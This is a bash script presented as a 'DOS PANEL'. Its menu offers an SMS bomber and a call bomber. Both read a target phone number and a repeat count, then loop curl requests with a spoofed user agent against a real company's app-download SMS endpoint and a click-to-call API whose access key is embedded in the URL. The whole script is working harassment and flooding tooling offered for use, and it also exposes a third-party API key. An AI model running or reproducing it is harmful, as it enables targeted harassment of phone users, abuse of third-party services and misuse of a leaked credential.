#!/bin/bash

clear

NC='\033[0m'          
Black='\033[0;30m'       
Red='\033[0;31m'         
Green='\033[1;32m'       
Yellow='\033[1;33m'      
Blue='\033[0;34m'     
Purple='\033[0;35m'       
Cyan='\033[1;36m'      
White='\033[0;37m'    
BGreen='\033[1;32m'     
BRed='\033[1;31m'


echo -e "${Cyan}+-------------------------------------------------------------------+${NC}"
echo -e "${Cyan}|${NC}                      ${BGreen}[${NC}${BRed}          VDU DOS PANEL${NC}${BGreen}]${NC}                    ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                                                   ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                            | ${NC}${Yellow}Coder:${NC}${BGreen} Suvadip Kar${NC}${NC} | ${NC}${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                            | ${Yellow}Version:${NC} ${BGreen}1.0${NC}       | ${Cyan}|${NC}"
echo -e "${Cyan}+-${NC}${Green}[ Enter Your Choice ]${Cyan}---------------------------------------------${Cyan}+${NC}"
echo -e "${Yellow}1. ${NC}SMS bomber"
echo -e "${Yellow}2. ${NC}Call Bomber\n"

read -p '[>>>]' pinu
smsbomb(){
	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s https://www.toppr.com/api/download-app/ -d phone=$no >> /dev/null
}

callbomb(){
	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s "http://ex1.zeotel.com/c2c?key=aQVblBv5h18xhjLNAwZqrQ-1403256058&ac=14945&ph=$no" >>/dev/null
}


if [ $pinu == 1 ]; then
	echo "Enter The Phone Number"
	read -p '[>>>]' no
	echo "Enter The Number of times to Send SMS"
	read -p '[>>>]' msg
	 	for x in `seq 1 $msg`; do
	 		smsbomb
	 		echo "sms $x sent"
	 	done

elif [ $pinu == 2 ]; then
	echo "Enter The Phone Number"
	read -p '[>>>]' no
	echo "Enter the Number of times to call"
	read -p '[>>>]' cal
		 for x in `seq 1 $cal`; do
		 	callbomb 
		 	echo "call $x In Process"
		 	sleep 25
		 done
else 
	echo -e "${Yellow}You Choosed A Wrong One${NC}"

fi
